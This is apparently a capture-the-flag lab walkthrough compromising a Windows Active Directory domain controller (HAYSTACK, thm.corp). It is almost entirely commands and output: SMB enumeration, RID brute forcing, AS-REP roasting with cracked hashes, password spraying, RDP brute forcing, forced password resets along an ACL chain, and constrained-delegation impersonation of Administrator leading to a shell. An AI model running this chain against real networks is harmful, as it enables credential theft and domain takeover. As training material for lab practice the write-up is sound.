## MACHINE IP
```bash
10.201.90.112
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Fri Oct 31 15:33:57 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.201.90.112
Nmap scan report for 10.201.90.112
Host is up (0.29s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-31 10:05:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-31T10:06:28+00:00
|_ssl-date: 2025-10-31T10:07:06+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Issuer: commonName=HayStack.thm.corp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-30T09:54:41
| Not valid after:  2026-05-01T09:54:41
| MD5:   cb1f:80d3:1ff0:395b:0f8c:6e3c:09e9:3ae7
|_SHA-1: 8a27:d8e3:ccfa:7f28:64c9:e188:bf9d:55bc:47f2:c689
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-31T10:06:29
|_  start_date: N/A

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 31 15:37:15 2025 -- 1 IP address (1 host up) scanned in 197.80 seconds
```
## OPEN PORTS - ANALYSIS
```bash
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-31 10:05:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
```
## ENUMERATION
```bash
- add thm.corp to /etc/hosts file
- add haystack.thm.corp also to /etc/hosts
  
# Port 139 445 
sudo nxc smb $ip --shares -u 'anonymous' -p ''
SMB         10.201.90.112   445    HAYSTACK         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False) 
SMB         10.201.90.112   445    HAYSTACK         [+] thm.corp\anonymous: (Guest)
SMB         10.201.90.112   445    HAYSTACK         [*] Enumerated shares
SMB         10.201.90.112   445    HAYSTACK         Share           Permissions     Remark
SMB         10.201.90.112   445    HAYSTACK         -----           -----------     ------
SMB         10.201.90.112   445    HAYSTACK         ADMIN$                          Remote Admin
SMB         10.201.90.112   445    HAYSTACK         C$                              Default share
SMB         10.201.90.112   445    HAYSTACK         Data            READ,WRITE      
SMB         10.201.90.112   445    HAYSTACK         IPC$            READ            Remote IPC
SMB         10.201.90.112   445    HAYSTACK         NETLOGON                        Logon server share 
SMB         10.201.90.112   445    HAYSTACK         SYSVOL                          Logon server share 

sudo nxc smb $ip -u 'anonymous' -p '' --spider Data --regex .

SMB         10.201.90.112   445    HAYSTACK         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False) 
SMB         10.201.90.112   445    HAYSTACK         [+] thm.corp\anonymous: (Guest)
SMB         10.201.90.112   445    HAYSTACK         [*] Started spidering
SMB         10.201.90.112   445    HAYSTACK         [*] Spidering .
SMB         10.201.90.112   445    HAYSTACK         //10.201.90.112/Data/. [dir]
SMB         10.201.90.112   445    HAYSTACK         //10.201.90.112/Data/.. [dir]
SMB         10.201.90.112   445    HAYSTACK         //10.201.90.112/Data/onboarding [dir]
SMB         10.201.90.112   445    HAYSTACK         //10.201.90.112/Data/onboarding/. [dir]
SMB         10.201.90.112   445    HAYSTACK         //10.201.90.112/Data/onboarding/.. [dir]
SMB         10.201.90.112   445    HAYSTACK         //10.201.90.112/Data/onboarding/1xk3uk4k.zkb.pdf [lastm:'2023-08-21 23:51' size:4700896]
SMB         10.201.90.112   445    HAYSTACK         //10.201.90.112/Data/onboarding/jimi4gx0.gq1.pdf [lastm:'2023-08-21 23:51' size:3032659]
SMB         10.201.90.112   445    HAYSTACK         //10.201.90.112/Data/onboarding/t0nqoffy.hc5.txt [lastm:'2023-08-21 23:52' size:521]
SMB         10.201.90.112   445    HAYSTACK         [*] Done spidering (Completed in 3.470801830291748)

- Checking the files found on share found creds 'ResetMe123!'

sudo nxc smb $ip --shares -u ./usernames -p ./passwords.txt --continue-on-success
SMB         10.201.90.112   445    HAYSTACK         [+] thm.corp\LILY_ONEILL:ResetMe123! (Guest)   
  
- Tried to reset smb password
sudo smbpasswd -U LILY_ONEILL -r $ip
Old SMB password:
New SMB password:
Retype new SMB password:
Bad SMB2 (sign_algo_id=1) signature for message 
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] DC 17 5B ED F2 40 EF 6D   D6 BC 24 D1 CB 1A AD 18   ..[..@.m ..$.....
Could not connect to machine 10.201.90.112: NT_STATUS_ACCESS_DENIED

# RID BRUTE FORCE 
sudo nxc smb $ip -u 'anonymous' -p '' --rid-brute | tee raw-rid
grep "SidTypeUser" raw-rid | awk -F'\\\\' '{print $2}' | awk '{print $1}' > usernames


# Checking usernames login using kerbrute
sudo ./kerbrute userenum ./usernames -d thm.corp --dc $ip | tee raw-kerbrute
Version: v1.0.3 (9dad6e1) - 10/31/25 - Ronnie Flathers @ropnop                                                                                                              16:07:30 [98/964]
2025/10/31 16:07:28 >  Using KDC(s):                                                                                                                                                         
2025/10/31 16:07:28 >   10.201.90.112:88
2025/10/31 16:07:28 >  [+] VALID USERNAME:       TRACY_CARVER@thm.corp
2025/10/31 16:07:28 >  [+] VALID USERNAME:       HAYSTACK$@thm.corp
2025/10/31 16:07:28 >  [+] VALID USERNAME:       3091731410SA@thm.corp
2025/10/31 16:07:28 >  [+] VALID USERNAME:       SHAWNA_BRAY@thm.corp
2025/10/31 16:07:28 >  [+] VALID USERNAME:       Guest@thm.corp
2025/10/31 16:07:28 >  [+] VALID USERNAME:       Administrator@thm.corp
2025/10/31 16:07:28 >  [+] VALID USERNAME:       CECILE_WONG@thm.corp
2025/10/31 16:07:28 >  [+] VALID USERNAME:       CYRUS_WHITEHEAD@thm.corp
2025/10/31 16:07:28 >  [+] VALID USERNAME:       DEANNE_WASHINGTON@thm.corp
2025/10/31 16:07:28 >  [+] VALID USERNAME:       JULIANNE_HOWE@thm.corp
2025/10/31 16:07:28 >  [+] VALID USERNAME:       MICHEL_ROBINSON@thm.corp
2025/10/31 16:07:28 >  [+] VALID USERNAME:       DANIEL_CHRISTENSEN@thm.corp
2025/10/31 16:07:28 >  [+] VALID USERNAME:       ELLIOT_CHARLES@thm.corp
2025/10/31 16:07:28 >  [+] VALID USERNAME:       ROSLYN_MATHIS@thm.corp
2025/10/31 16:07:28 >  [+] VALID USERNAME:       MITCHELL_SHAW@thm.corp
2025/10/31 16:07:28 >  [+] VALID USERNAME:       FANNY_ALLISON@thm.corp
2025/10/31 16:07:28 >  [+] VALID USERNAME:       MARCELINO_BALLARD@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       ERNESTO_SILVA@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       STEWART_SANTANA@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       LINDSAY_SCHULTZ@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       HOWARD_PAGE@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       CRUZ_HALL@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       RICO_PEARSON@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       DARLA_WINTERS@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       ANDY_BLACKWELL@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       CHERYL_MULLINS@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       3811465497SA@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       HORACE_BOYLE@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       MORGAN_SELLERS@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       MARION_CLAY@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       LETHA_MAYO@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       3966486072SA@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       CHRISTINA_MCCORMICK@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       TED_JACOBSON@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       TABATHA_BRITT@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       AUGUSTA_HAMILTON@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       RAQUEL_BENSON@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       TREVOR_MELTON@thm.corp
2025/10/31 16:07:29 >  [+] VALID USERNAME:       AUTOMATE@thm.corp
2025/10/31 16:07:30 >  [+] VALID USERNAME:       LEANN_LONG@thm.corp
2025/10/31 16:07:30 >  Done! Tested 42 usernames (40 valid) in 2.006 seconds


# ASREP Roasting
sudo impacket-GetNPUsers thm.corp/ -usersfile ./usernames -format john -outputfile asrep-hashes.txt -dc-ip $ip
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set      
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set            
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HAYSTACK$ doesn't have UF_DONT_REQUIRE_PREAUTH set            
[-] User 3091731410SA doesn't have UF_DONT_REQUIRE_PREAUTH set          
$krb5asrep$ERNESTO_SILVA@THM.CORP:bc3a0ee89d0b6bce0c887acc1becd5cc$7256805092b2c753b09f2927f9ff658ff3b64f86585d7a1427137be0f047b96fe45e7fe34846127049239bfdf0242746d17637f11663167e476bcd35d6
0e9daae30bc0144f8ef3a426badd8e2ea0b1bcb4c7d4835861ccc108f6ff91367c6f62724f9148ff619d6409438ed008f437f4246c31fdd3ce47a632cbca14507319216489b7aa534efe895a63deb49e57e06f7fd08eb270788c92e4bc174
3133076e32f144d82cbbed57679e4d3b6032471b54e3029a18657174e4747c82ebb330f468fd1a5275fa08f426326d7ba3c5f1fc9a00b3f40b64e3259eeadf0200acbed433c79b275
[-] User TRACY_CARVER doesn't have UF_DONT_REQUIRE_PREAUTH set          
[-] User SHAWNA_BRAY doesn't have UF_DONT_REQUIRE_PREAUTH set        
[-] User CECILE_WONG doesn't have UF_DONT_REQUIRE_PREAUTH set       
[-] User CYRUS_WHITEHEAD doesn't have UF_DONT_REQUIRE_PREAUTH set     
[-] User DEANNE_WASHINGTON doesn't have UF_DONT_REQUIRE_PREAUTH set          
[-] User ELLIOT_CHARLES doesn't have UF_DONT_REQUIRE_PREAUTH set      
[-] User MICHEL_ROBINSON doesn't have UF_DONT_REQUIRE_PREAUTH set      
[-] User MITCHELL_SHAW doesn't have UF_DONT_REQUIRE_PREAUTH set           
[-] User FANNY_ALLISON doesn't have UF_DONT_REQUIRE_PREAUTH set        
[-] User JULIANNE_HOWE doesn't have UF_DONT_REQUIRE_PREAUTH set        
[-] User ROSLYN_MATHIS doesn't have UF_DONT_REQUIRE_PREAUTH set   
[-] User DANIEL_CHRISTENSEN doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MARCELINO_BALLARD doesn't have UF_DONT_REQUIRE_PREAUTH set         
[-] User CRUZ_HALL doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HOWARD_PAGE doesn't have UF_DONT_REQUIRE_PREAUTH set        
[-] User STEWART_SANTANA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User LINDSAY_SCHULTZ doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$TABATHA_BRITT@THM.CORP:34854e71d8c435f228d9c3f1271c0165$cc24dabc98abbd4082580df5f986820da2fe6f943ab924566ca4a56dd5de5f242ecdcc562288806c3b2e82010e8583d703d95a48e4d0f585e129f19076
9bd8b0fa2ae27b5ddc6199479aa50a96c4732d95f54c82b933c640cae709aefea296a3bd3e482a4bf6ee57d73637d46359962dbf36d7a4658d7d4a9554ecb7d6e0db6dd7c797155c0ca60d13444597f97aad36df34700cbf6bc05df6e61c1
5d98fa0885f5ffe3ee6b531eb1ff620203fba36aa864051976fcd80600a7bb132bc226bf42cdac216f44b410fc24e6dea368f6cca549d8d93d992774a7e8b0170ca4c4184bd20feb8
[-] User RICO_PEARSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARLA_WINTERS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ANDY_BLACKWELL doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User CHERYL_MULLINS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User LETHA_MAYO doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HORACE_BOYLE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CHRISTINA_MCCORMICK doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User 3811465497SA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MORGAN_SELLERS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MARION_CLAY doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User 3966486072SA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User TED_JACOBSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User AUGUSTA_HAMILTON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User TREVOR_MELTON doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$LEANN_LONG@THM.CORP:6f284c2b98b18ae7f5ed88cf5c1f28a3$6f2d4e095a573cd71cbb957e90a93d357862f0046f92b0322af24ea69d94333729bf3ad10e915294e1eee17de535d972e18e8a661a12adfed026b83bb24ac
4874a175be74df9f3517c7227b9ad03644a41155f4d376128ced3866239f0fc408c5e31e187068759f0a4323341576450f7e8bd8f5583954cf2a73e97becd77f5d29ba096463bf0c590d23656419fc8130ce73296f44e70c317230f2aa732
1400acab521901d450355b945c4ed7584802157e82e5214af993b29d0daed992b3fa130cb15e2f1da7ec63456c1c6786a01e53d3f9ad0bb4626f848b44a8fcafc13cdb6f43eeff
[-] User RAQUEL_BENSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User AUTOMATE doesn't have UF_DONT_REQUIRE_PREAUTH set

# Crack Asrep Hashes
sudo john --wordlist=/usr/share/wordlists/rockyou.txt asrep-hashes.txt                                         
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
marlboro(1985)   ($krb5asrep$TABATHA_BRITT@THM.CORP)     
1g 0:00:00:34 DONE (2025-10-31 16:10) 0.02930g/s 420391p/s 1009Kc/s 1009KC/s !!12Honey..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

# More Creds
TABATHA_BRITT:marlboro(1985)

# More SMB Enumeration
sudo nxc smb $ip --shares -u ./usernames -p ./passwords.txt --continue-on-success  
SMB         10.201.90.112   445    HAYSTACK         [+] thm.corp\TABATHA_BRITT:marlboro(1985)

# RDP Brute 
sudo patator rdp_login host=$ip user=FILE0 password=FILE1 0=./usernames 1=./passwords.txt -x ignore:code=134
16:27:47 patator    INFO - Starting Patator 1.0 (https://github.com/lanjelot/patator) with python-3.13.7 at 2025-10-31 16:27 IST
16:27:47 patator    INFO -                                                                              
16:27:47 patator    INFO - code  size    time | candidate                          |   num | mesg
16:27:47 patator    INFO - -----------------------------------------------------------------------------
16:27:49 patator    INFO - 156   44     1.890 | Administrator:marlboro(1985)       |     1 | exit: 0, err: ERRCONNECT_ACCOUNT_RESTRICTION
16:27:55 patator    INFO - 156   44     1.826 | MARION_CLAY:marlboro(1985)         |    35 | exit: 0, err: ERRCONNECT_ACCOUNT_RESTRICTION
16:27:55 patator    INFO - 156   44     1.828 | HORACE_BOYLE:marlboro(1985)        |    31 | exit: 0, err: ERRCONNECT_ACCOUNT_RESTRICTION
16:27:55 patator    INFO - 156   44     1.838 | AUGUSTA_HAMILTON:marlboro(1985)    |    38 | exit: 0, err: ERRCONNECT_ACCOUNT_RESTRICTION
16:27:57 patator    INFO - 0     42     6.563 | TABATHA_BRITT:marlboro(1985)       |    24 | exit: 1, err: ERRCONNECT_CONNECT_CANCELLED
16:27:59 patator    INFO - 156   44     1.832 | MORGAN_SELLERS:marlboro(1985)      |    34 | exit: 0, err: ERRCONNECT_ACCOUNT_RESTRICTION

```
## INITIAL SHELL
```bash
sudo xfreerdp3 /d:thm.corp /u:TABATHA_BRITT /p:'marlboro(1985)' /cert:ignore /v:$ip +clipboard /dynamic-resolution

- RDP works !!! able to login using TABATHA_BRITT:marlboro(1985)

# More Enumeration - Collecting Information for bloodhound
sudo nxc ldap $ip -u 'TABATHA_BRITT' -p 'marlboro(1985)' --bloodhound --collection All --dns-server $ip
LDAP        10.201.90.112   389    HAYSTACK         [*] Windows 10 / Server 2019 Build 17763 (name:HAYSTACK) (domain:thm.corp)
LDAP        10.201.90.112   389    HAYSTACK         [+] thm.corp\TABATHA_BRITT:marlboro(1985) 
LDAP        10.201.90.112   389    HAYSTACK         Resolved collection methods: localadmin, objectprops, rdp, group, acl, psremote, dcom, trusts, session, container
LDAP        10.201.90.112   389    HAYSTACK         Done in 02M 32S
LDAP        10.201.90.112   389    HAYSTACK         Compressing output into /root/.nxc/logs/HAYSTACK_10.201.90.112_2025-10-31_163752_bloodhound.zip
```
## PRIVILEGE ESCALATION
```bash
# Uploading the Zip to BloodHound and Checking 
- Shortest path to Domain Admins
  
TABATHA_BRITT ---Has-GenericALl-To--> SHAWNA_BRAY ---ForceChangePassword--> CRUZ_HALL ---Owns---> DARLA_WINTERS

- Now I change New creds to all users till darla_winters
  
net rpc password "SHAWNA_BRAY" "newP@ssword2022" -U thm.corp/TABATHA_BRITT%'marlboro(1985)' -S $ip

net rpc password "CRUZ_HALL" "newP@ssword2023" -U thm.corp/SHAWNA_BRAY%'newP@ssword2022' -S thm.corp

net rpc password "DARLA_WINTERS" "newP@ssword2024" -U thm.corp/CRUZ_HALL%'newP@ssword2023' -S thm.corp

# Creds
SHAWNA_BRAY:newP@ssword2022
CRUZ_HALL:newP@ssword2023
DARLA_WINTERS:newP@ssword2024

# DARLA_WINTERS is allowed to delegate cifs/HayStack.thm.corp
sudo impacket-getST -spn cifs/HayStack.thm.corp -dc-ip $ip -impersonate Administrator thm.corp/DARLA_WINTERS:'newP@ssword2024'
mpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[-] CCache file is not found. Skipping...                                                     
[*] Getting TGT for user                                                                      
[*] Impersonating Administrator                                                               
[*] Requesting S4U2self                                                                       
[*] Requesting S4U2Proxy                                                                      
[*] Saving ticket in Administrator@cifs_HayStack.thm.corp@THM.CORP.ccache     

export KRB5CCNAME=Administrator@cifs_HayStack.thm.corp@THM.CORP.ccache
```
## ROOT | ADMINISTRATOR - PWNED
```bash
sudo impacket-wmiexec -k -no-pass THM.corp/Administrator@HayStack.thm.corp
C:\>whoami
thm\administrator
```
